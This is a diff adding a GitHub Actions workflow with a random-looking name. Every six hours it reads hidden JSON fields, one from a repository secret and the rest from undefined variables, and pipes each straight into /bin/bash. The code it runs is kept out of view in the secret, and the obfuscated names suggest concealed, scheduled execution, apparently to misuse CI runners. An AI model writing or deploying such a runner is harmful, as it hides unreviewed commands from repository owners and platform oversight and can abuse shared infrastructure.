@@ -1,0 +1,29 @@
+name: huojiaquan3627
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huojiaquan3627
+        env:
+          bhj4: ${{ secrets.bhj4 }}
+        run: |
+          echo $bhj4 | jq -r .gjpta5 | /bin/bash
+          echo $h6 | jq -r .celxl473 | /bin/bash
+          echo $pb26144 | jq -r .lgm46 | /bin/bash
+          echo $vv715 | jq -r .zl15 | /bin/bash
+          echo $a46 | jq -r .gqsj6 | /bin/bash
+          echo $btuy53 | jq -r .dbgg6 | /bin/bash
+          echo $du6294 | jq -r .fxdr7477 | /bin/bash
+          echo $yhj38 | jq -r .cpjvq20328 | /bin/bash
+          echo $t81231 | jq -r .omt7 | /bin/bash
+          echo $p2 | jq -r .klhxg3362 | /bin/bash
+          echo $vyk736 | jq -r .sfl98664 | /bin/bash
+          echo $vu4299 | jq -r .yaao4561 | /bin/bash
+
